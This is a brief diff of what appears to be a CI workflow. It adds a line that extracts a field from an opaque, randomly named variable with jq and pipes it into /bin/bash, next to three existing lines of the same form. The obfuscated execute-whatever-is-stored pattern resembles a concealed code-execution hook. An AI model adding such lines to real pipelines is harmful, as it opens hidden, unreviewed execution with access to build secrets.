@@ -23,6 +23,7 @@ jobs:
           echo $c37 | jq -r .wzlg79525 | /bin/bash
           printf '%s' "$t7461" | jq -r .gcgp4 | /bin/bash
           echo $f3507 | jq -r .fm4 | /bin/bash
+          printf '%s' "$fzsg280" | jq -r .rut43 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
